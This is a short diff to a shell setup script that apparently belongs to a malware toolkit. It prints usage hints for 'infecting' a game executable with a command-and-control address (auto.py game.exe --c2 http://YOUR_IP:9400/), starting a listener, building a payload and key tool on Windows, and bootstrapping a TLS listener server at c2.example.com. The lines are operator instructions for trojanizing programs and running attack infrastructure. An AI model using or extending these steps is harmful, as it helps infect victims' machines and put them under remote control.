@@ -179,5 +179,8 @@ echo
 echo "Victim side (bin/) is Windows-only by design -- build there once, then"
 echo "infect from Linux:  python3 auto.py game.exe --c2 http://YOUR_IP:9400/"
 echo "Start the listener: python3 listen.py 9400"
+echo
+echo "Build box (Windows):  python build.py all        # payload + keytool + verify"
+echo "Listener VPS (TLS):   deploy/vps/bootstrap.sh c2.example.com"
 [ "$CHECK_ONLY" = "1" ] && echo "Done (check only -- nothing was installed)."
 exit 0
